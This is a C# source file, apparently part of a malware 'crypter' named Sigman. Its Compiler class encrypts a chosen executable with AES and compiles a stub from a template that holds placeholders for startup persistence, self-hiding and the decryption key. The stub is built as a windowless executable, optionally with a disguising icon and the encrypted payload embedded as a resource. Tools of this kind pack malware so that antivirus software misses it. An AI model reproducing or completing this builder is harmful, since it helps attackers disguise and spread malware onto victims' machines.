using System;
using System.IO;
using System.Text;
using System.Resources;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Security.Cryptography;
using Microsoft.CSharp;
using System.Windows.Forms;
using Sigman.Core.Cryptography.Aes;

namespace Sigman.Server.Server {
    public class Compiler {

        public static byte[] AESEncrypt(byte[] input, string Pass) {
            RijndaelManaged AES = new RijndaelManaged();
            byte[] hash = new byte[32];
            byte[] temp = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(Pass));
            Array.Copy(temp, 0, hash, 0, 16);
            Array.Copy(temp, 0, hash, 15, 16);
            AES.Key = hash;
            AES.Mode = CipherMode.ECB;
            ICryptoTransform DESEncrypter = AES.CreateEncryptor();
            return DESEncrypter.TransformFinalBlock(input, 0, input.Length);
        }

        private void CreateStub(string uniqueKey, string key, string file) {
            // We read the source of the stub from the resources
            // and we're storing it into a variable.
            string Source = File.ReadAllText("Stub.txt");

            // If the user picked a storage method (he obviously did)
            // then replace the value on the source of the stub
            // that will later tell the stub from where it should
            // read the bytes.
            // User picked managed resources method.
            Source = Source.Replace("[storage-replace]", "managed");

            // Check to see if the user enabled startup
            // and replace the boolean value in the stub
            // which indicates if the crypted file should
            // add itself to startup
            // User did not enable startup.
             Source = Source.Replace("[startup-replace]", "false");

            // Check to see if the user enabled hide file
            // and replace the boolean value in the stub
            // which indicates if the crypted file should hide itself
            // User did not enable hide file.
            Source = Source.Replace("[hide-replace]", "false");

            // Replace the encryption key in the stub
            // as it will be used by it in order to
            // decrypt the encrypted file.
            Source = Source.Replace("[key-replace]", key);

            // Read the bytes of the file the user wants to crypt.
            byte[] FileBytes = File.ReadAllBytes(file);

            // Encrypt the file using the AES encryption algorithm.
            // The key is the random string the user generated.

            byte[] EncryptedBytes = AESEncrypt(FileBytes, key);

            File.WriteAllText(uniqueKey + "/source.txt", Source);

            // Compile the file according to the storage method the user picked.
            // We also declare a variable to store the result of the compilation.
            //bool success;
            //if (radioButton1.Checked) /* User picked native resources method */
            //{
            //    // Check if the user picked an icon file and if it exists.
            //    if (File.Exists(textBox2.Text))
            //        // Compile with an icon.
            //        success = Compiler.CompileFromSource(Source, FSave.FileName, textBox2.Text);
            //    else
            //        // Compile without an icon.
           // success = Compiler.CompileFromSource(Source, FSave.FileName);

           //    Writer.WriteResource(FSave.FileName, EncryptedBytes);
            //}
            //else {
                // The user picked the managed resource method so we'll create
                // a resource file that will contain the bytes. Then we will
                // compile the stub and add that resource file to the compiled
                // stub.
            //    string ResFile = Path.Combine(Application.StartupPath, "Encrypted.resources");
            //    using (ResourceWriter Writer = new ResourceWriter(ResFile)) {
            //        // Add the encrypted bytes to the resource file.
            //        Writer.AddResource("encfile", EncryptedBytes);
            //        // Generate the resource file.
            //        Writer.Generate();
            //    }

            //    // Check if the user picked an icon file and if it exists.
            //    if (File.Exists(textBox2.Text))
            //        // Compile with an icon.
            //        success = Compiler.CompileFromSource(Source, FSave.FileName, textBox2.Text, new string[] { ResFile });
            //    else
            //        // Compile without an icon.
            //        success = Compiler.CompileFromSource(Source, FSave.FileName, null, new string[] { ResFile });

            //    // Now that the stub was compiled, we delete
            //    // the resource file since we don't need it anymore.
            //    File.Delete(ResFile);
            //}

            //if (success) {
            //    MessageBox.Show("Your file has been successfully protected.",
            //        "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            //}
        }

        public static bool CompileFromSource(string source, string Output, string Icon = null, string[] Resources = null) {
            // We declare the new compiler parameters variable
            // that will contain all settings for the compilation.
            CompilerParameters CParams = new CompilerParameters();

            // We want an executable file on disk.
            CParams.GenerateExecutable = true;
            // This is where the compiled file will be saved into.
            CParams.OutputAssembly = Output;

            // We need these compiler options, we will use code optimization,
            // compile as a x86 process and our target is a windows form.
            // The unsafe keyword is used because the stub contains pointers and
            // unsafe blocks of code.
            string options = "/optimize+ /platform:x86 /target:winexe /unsafe";
            // If the icon is not null (as we initialize it), add the corresponding option.
            if (Icon != null)
                options += " /win32icon:\"" + Icon + "\"";

            // Set the options.
            CParams.CompilerOptions = options;
            // We don't care about warnings, we don't need them to show as errors.
            CParams.TreatWarningsAsErrors = false;

            // Add the references to the libraries we use so we can have access
            // to their namespaces.
            CParams.ReferencedAssemblies.Add("System.dll");
            CParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            CParams.ReferencedAssemblies.Add("System.Drawing.dll");
            CParams.ReferencedAssemblies.Add("System.Data.dll");
            CParams.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");

            // Check if the user specified any resource files.
            // If yes, add then to the stub's resources.
            if (Resources != null && Resources.Length > 0) {
                // Loop through all resource files specified in the Resources[] array.
                foreach (string res in Resources) {
                    // Add each resource file to the compiled stub.
                    CParams.EmbeddedResources.Add(res);
                }
            }

            // Dictionary variable is used to tell the compiler that we want
            // our file to be compiled for .NET v2
            Dictionary<string, string> ProviderOptions = new Dictionary<string, string>();
            ProviderOptions.Add("CompilerVersion", "v2.0");

            // Now, we compile the code and get the result back in the "Results" variable
            CompilerResults Results = new CSharpCodeProvider(ProviderOptions).CompileAssemblyFromSource(CParams, source);

            // Check if any errors occured while compiling.
            if (Results.Errors.Count > 0) {
                // Errors occured, notify the user.
                //MessageBox.Show(string.Format("The compiler has encountered {0} errors",
                //    Results.Errors.Count), "Errors while compiling", MessageBoxButtons.OK,
                //    MessageBoxIcon.Error);

                // Now loop through all errors and show them to the user.
                //foreach (CompilerError Err in Results.Errors) {
                //    MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", Err.ErrorText,
                //        Err.Line, Err.Column, Err.FileName), "Error",
                //        MessageBoxButtons.OK, MessageBoxIcon.Error);
                //}

                return false;

            }
            else {
                // No error was found, return true.
                return true;
            }

        }
    }
}
